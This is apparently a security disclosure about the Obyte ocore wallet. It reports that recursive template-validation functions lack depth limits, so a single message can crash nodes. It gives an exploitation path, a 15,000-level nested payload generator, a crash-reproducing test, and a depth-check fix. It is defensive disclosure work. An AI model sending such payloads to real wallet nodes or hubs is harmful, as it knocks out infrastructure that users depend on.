# Stack Overflow DoS via Unbounded Recursion in Address Definition Template Validation

## Summary

The `validateAddressDefinitionTemplate()` function in `wallet_defined_by_addresses.js` processes address definition templates through two recursive helper functions that lack depth limits. [1](#0-0) [2](#0-1)  These functions are called before complexity checks, allowing attackers to trigger JavaScript stack overflow by submitting deeply nested templates via P2P device messaging, crashing wallet nodes and hub operators.

## Impact

**Severity**: Medium  
**Category**: Temporary Transaction Delay

**Affected Assets**: Wallet node availability, hub operator uptime, light client transaction submission capability

**Damage Severity**:
- **Quantitative**: Single malicious message crashes any wallet node or hub that accepts device pairing. Attack repeatable indefinitely. If multiple hubs crash, light clients cannot submit transactions for ≥1 hour. Each crashed node requires manual restart.
- **Qualitative**: Denial of service for wallet infrastructure. No fund theft or data corruption, but network transaction processing capacity is degraded during attacks.

**User Impact**:
- **Who**: Wallet nodes, hub operators accepting device pairing, light wallet users (indirectly, if hubs crash)
- **Conditions**: Exploitable after standard device pairing. Attack automatable and distributable.
- **Recovery**: Manual node restart required. No automatic recovery. Nodes remain vulnerable until patched.

**Systemic Risk**: If enough hubs crash simultaneously, light clients cannot connect and submit transactions, causing delays ≥1 hour. Pure validator nodes without wallet functionality continue operating normally.

## Finding Description

**Location**: `byteball/ocore/wallet_defined_by_addresses.js:384-424` (function `getMemberDeviceAddressesBySigningPaths`) and `byteball/ocore/definition.js:1327-1354` (function `replaceInTemplate`)

**Intended Logic**: Address definition template validation should reject malicious inputs before resource exhaustion occurs through complexity/ops limits.

**Actual Logic**: The validation pipeline calls two recursive functions without depth checks BEFORE the complexity counters are evaluated. The `getMemberDeviceAddressesBySigningPaths` function contains a nested `evaluate` function that recursively processes 'and', 'or', 'r of set', and 'weighted and' operations without any recursion depth limit. [1](#0-0)  Similarly, `replaceInTemplate` contains a nested `replaceInVar` function that recursively processes nested arrays and objects without depth limits. [2](#0-1) 

**Exploitation Path**:

1. **Preconditions**: Attacker pairs their device with a victim wallet node or hub (standard Obyte device pairing procedure).

2. **Step 1**: Attacker constructs a malicious address definition template with 15,000+ nested levels:
   ```javascript
   let template = ['and', [['address', '$address@deviceA']]];
   for (let i = 0; i < 15000; i++) {
       template = ['and', [template]];
   }
   ```

3. **Step 2**: Attacker sends `create_new_shared_address` message containing the malicious template. The message handler in `wallet.js` receives it. [3](#0-2) 

4. **Step 3**: Handler calls `validateAddressDefinitionTemplate()` which immediately calls `getMemberDeviceAddressesBySigningPaths()` at line 427. [4](#0-3)  The internal `evaluate` function recursively processes each nested 'and' operation, making 15,000+ recursive calls.

5. **Step 4**: JavaScript call stack (typically 10,000-15,000 frames) is exhausted before reaching the complexity checks at lines 98-103 in `definition.js:validateDefinition()`. [5](#0-4)  Node crashes with "Maximum call stack size exceeded" error.

**Security Property Broken**: Node availability - Wallet infrastructure can be crashed on demand via P2P messaging.

**Root Cause Analysis**: The validation architecture has layered defenses with complexity/ops counters (MAX_COMPLEXITY=100, MAX_OPS=2000) [6](#0-5) , but these are only enforced in `validateDefinition()` which is called AFTER the vulnerable recursive pre-processing functions. JavaScript's call stack is a finite resource (~10k-15k frames), exhausted by deep recursion regardless of complexity counters.

## Likelihood Explanation

**Attacker Profile**:
- **Identity**: Any user with device pairing capability
- **Resources Required**: Single node, target device addresses (obtainable through network participation), ability to construct nested JSON
- **Technical Skill**: Low - 10 lines of JavaScript to create payload

**Preconditions**:
- **Network State**: Normal operation
- **Attacker State**: Device pairing with target (standard wallet operation)
- **Timing**: Any time after pairing

**Execution Complexity**:
- **Transaction Count**: Zero on-chain transactions
- **Coordination**: None for single target; trivial for multiple targets
- **Detection Risk**: Low - appears as normal message until crash

**Frequency**:
- **Repeatability**: Unlimited - no rate limiting on device messages
- **Scale**: Can target multiple nodes in parallel

**Overall Assessment**: High likelihood for wallet infrastructure, but limited to nodes accepting device pairing.

## Recommendation

**Immediate Mitigation**:

Add depth tracking to both recursive functions:

```javascript
// In wallet_defined_by_addresses.js:384
function getMemberDeviceAddressesBySigningPaths(arrAddressDefinitionTemplate){
    var MAX_DEPTH = 100;
    function evaluate(arr, path, depth){
        if (depth > MAX_DEPTH)
            throw Error("address definition template nesting depth exceeded");
        var op = arr[0];
        var args = arr[1];
        // ... rest of logic, passing depth+1 to recursive calls
    }
    var assocMemberDeviceAddressesBySigningPaths = {};
    evaluate(arrAddressDefinitionTemplate, 'r', 0);
    return assocMemberDeviceAddressesBySigningPaths;
}
```

Similar depth check should be added to `replaceInTemplate` in `definition.js`.

**Additional Measures**:
- Add test case validating rejection of deeply nested templates
- Monitor device message rates for anomalies
- Consider rate limiting device messages per correspondent

## Proof of Concept

```javascript
const test = require('ava');
const walletDefinedByAddresses = require('../wallet_defined_by_addresses.js');

test('deeply nested template causes stack overflow', t => {
    // Construct deeply nested template
    let malicious_template = ['and', [['address', '$address@0DEVICE1AAAAAAAAAAAAAAAAAAAAAAAAAAAA']]];
    
    // Create 15000 nested levels (exceeds typical JS stack limit of ~10-15k)
    for (let i = 0; i < 15000; i++) {
        malicious_template = ['and', [malicious_template]];
    }
    
    // Attempt validation - should crash with stack overflow
    // before reaching complexity checks
    const from_address = '0DEVICE2BBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    
    t.throws(() => {
        walletDefinedByAddresses.validateAddressDefinitionTemplate(
            malicious_template,
            from_address,
            function(err, result) {
                // This callback is never reached due to stack overflow
                if (err) console.log('Validation error:', err);
            }
        );
    }, {
        name: 'RangeError',
        message: /Maximum call stack size exceeded/
    });
});

test('reasonable nesting depth should work', t => {
    // Normal template with 3 levels of nesting
    let normal_template = ['and', [
        ['address', '$address@0DEVICE1AAAAAAAAAAAAAAAAAAAAAAAAAAAA'],
        ['address', '$address@0DEVICE2BBBBBBBBBBBBBBBBBBBBBBBBBBBB']
    ]];
    
    const from_address = '0DEVICE2BBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    
    walletDefinedByAddresses.validateAddressDefinitionTemplate(
        normal_template,
        from_address,
        function(err, result) {
            if (err) {
                t.fail('Normal template should not cause error: ' + err);
            } else {
                t.pass('Normal template validated successfully');
            }
        }
    );
});
```

## Notes

This vulnerability affects **wallet infrastructure** (nodes running `wallet.js` that accept device pairing), not the core consensus protocol. Pure validator nodes without wallet functionality are unaffected. The severity is classified as **MEDIUM** rather than CRITICAL because:

1. It requires device pairing (not completely unauthenticated)
2. Full validator nodes continue processing units
3. Recovery is simple restart (no data corruption)
4. Network doesn't completely halt

However, if critical infrastructure (hubs, popular wallet services) is targeted, transaction submission delays ≥1 hour can occur for light clients, meeting the MEDIUM severity threshold for "Temporary Transaction Delay."

The fix is straightforward: add depth counters to both recursive functions with limits matching or lower than the existing MAX_COMPLEXITY constant (100). This ensures stack overflow cannot occur before validation checks reject the input.

### Citations

**File:** wallet_defined_by_addresses.js (L384-424)
```javascript
function getMemberDeviceAddressesBySigningPaths(arrAddressDefinitionTemplate){
	function evaluate(arr, path){
		var op = arr[0];
		var args = arr[1];
		if (!args)
			return;
		switch (op){
			case 'or':
			case 'and':
				for (var i=0; i<args.length; i++)
					evaluate(args[i], path + '.' + i);
				break;
			case 'r of set':
				if (!ValidationUtils.isNonemptyArray(args.set))
					return;
				for (var i=0; i<args.set.length; i++)
					evaluate(args.set[i], path + '.' + i);
				break;
			case 'weighted and':
				if (!ValidationUtils.isNonemptyArray(args.set))
					return;
				for (var i=0; i<args.set.length; i++)
					evaluate(args.set[i].value, path + '.' + i);
				break;
			case 'address':
				var address = args;
				var prefix = '$address@';
				if (!ValidationUtils.isNonemptyString(address) || address.substr(0, prefix.length) !== prefix)
					return;
				var device_address = address.substr(prefix.length);
				assocMemberDeviceAddressesBySigningPaths[path] = device_address;
				break;
			case 'definition template':
				throw Error(op+" not supported yet");
			// all other ops cannot reference device address
		}
	}
	var assocMemberDeviceAddressesBySigningPaths = {};
	evaluate(arrAddressDefinitionTemplate, 'r');
	return assocMemberDeviceAddressesBySigningPaths;
}
```

**File:** wallet_defined_by_addresses.js (L426-456)
```javascript
function validateAddressDefinitionTemplate(arrDefinitionTemplate, from_address, handleResult){
	var assocMemberDeviceAddressesBySigningPaths = getMemberDeviceAddressesBySigningPaths(arrDefinitionTemplate);
	var arrDeviceAddresses = _.uniq(_.values(assocMemberDeviceAddressesBySigningPaths));
	if (arrDeviceAddresses.length < 2)
		return handleResult("less than 2 member devices");
	if (arrDeviceAddresses.indexOf(device.getMyDeviceAddress()) === - 1)
		return handleResult("my device address not mentioned in the definition");
	if (arrDeviceAddresses.indexOf(from_address) === - 1)
		return handleResult("sender device address not mentioned in the definition");
	
	var params = {};
	// to fill the template for validation, assign my device address (without leading 0) to all member devices 
	// (we need just any valid address with a definition)
	var fake_address = device.getMyDeviceAddress().substr(1);
	arrDeviceAddresses.forEach(function(device_address){
		params['address@'+device_address] = fake_address;
	});
	try{
		var arrFakeDefinition = Definition.replaceInTemplate(arrDefinitionTemplate, params);
	}
	catch(e){
		return handleResult(e.toString());
	}
	var objFakeUnit = {authors: [{address: fake_address, definition: ["sig", {pubkey: device.getMyDevicePubKey()}]}]};
	var objFakeValidationState = {last_ball_mci: MAX_INT32};
	Definition.validateDefinition(db, arrFakeDefinition, objFakeUnit, objFakeValidationState, null, false, function(err){
		if (err)
			return handleResult(err);
		handleResult(null, assocMemberDeviceAddressesBySigningPaths);
	});
}
```

**File:** definition.js (L97-103)
```javascript
	function evaluate(arr, path, bInNegation, cb){
		complexity++;
		count_ops++;
		if (complexity > constants.MAX_COMPLEXITY)
			return cb("complexity exceeded at "+path);
		if (count_ops > constants.MAX_OPS)
			return cb("number of ops exceeded at "+path);
```

**File:** definition.js (L1327-1354)
```javascript
function replaceInTemplate(arrTemplate, params){
	function replaceInVar(x){
		switch (typeof x){
			case 'number':
			case 'boolean':
				return x;
			case 'string':
				// searching for pattern "$name"
				if (x.charAt(0) !== '$')
					return x;
				var name = x.substring(1);
				if (!ValidationUtils.hasOwnProperty(params, name))
					throw new NoVarException("variable "+name+" not specified, template "+JSON.stringify(arrTemplate)+", params "+JSON.stringify(params));
				return params[name]; // may change type if params[name] is not a string
			case 'object':
				if (Array.isArray(x))
					for (var i=0; i<x.length; i++)
						x[i] = replaceInVar(x[i]);
				else
					for (var key in x)
						assignField(x, key, replaceInVar(x[key]));
				return x;
			default:
				throw Error("unknown type");
		}
	}
	return replaceInVar(_.cloneDeep(arrTemplate));
}
```

**File:** wallet.js (L173-187)
```javascript
			case "create_new_shared_address":
				// {address_definition_template: [...]}
				if (!ValidationUtils.isArrayOfLength(body.address_definition_template, 2))
					return callbacks.ifError("no address definition template");
				walletDefinedByAddresses.validateAddressDefinitionTemplate(
					body.address_definition_template, from_address, 
					function(err, assocMemberDeviceAddressesBySigningPaths){
						if (err)
							return callbacks.ifError(err);
						// this event should trigger a confirmatin dialog, user needs to approve creation of the shared address and choose his 
						// own address that is to become a member of the shared address
						eventBus.emit("create_new_shared_address", body.address_definition_template, assocMemberDeviceAddressesBySigningPaths);
						callbacks.ifOk();
					}
				);
```

**File:** constants.js (L57-66)
```javascript
exports.MAX_COMPLEXITY = process.env.MAX_COMPLEXITY || 100;
exports.MAX_UNIT_LENGTH = process.env.MAX_UNIT_LENGTH || 5e6;

exports.MAX_PROFILE_FIELD_LENGTH = 50;
exports.MAX_PROFILE_VALUE_LENGTH = 100;

exports.MAX_AA_STRING_LENGTH = 4096;
exports.MAX_STATE_VAR_NAME_LENGTH = 128;
exports.MAX_STATE_VAR_VALUE_LENGTH = 1024;
exports.MAX_OPS = process.env.MAX_OPS || 2000;
```
